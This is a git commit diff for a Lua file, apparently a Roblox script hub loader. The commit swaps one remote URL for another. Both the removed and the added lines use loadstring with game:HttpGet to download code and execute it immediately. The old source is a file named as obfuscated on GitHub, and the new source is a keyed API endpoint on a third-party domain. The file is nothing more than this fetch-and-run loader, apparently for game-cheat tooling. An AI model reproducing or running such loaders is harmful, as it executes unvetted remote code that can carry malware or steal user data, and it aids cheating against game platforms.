774f5c67f65d4acebe653ec21a4f99348c68e548
wackshopr-tech <wack.shopr@gmail.com>
2026-09-13 13:12:56 +0700

    Update Main-GUI-2.lua

--- Main-GUI-2.lua
+++ Main-GUI-2.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/myks272626/RUNLUA-HUB/refs/heads/main/Gui-1-obfuscated.lua"))()
+loadstring(game:HttpGet("https://rizz-rxs.xyz/Onyx-Zero/api?key=07331f83389b3e8a7ed870bd649c3076&_s=c3cf7daa1badb324f580633406127a498c9159e96cb3ac64d87f3e68c3da0e98"))()
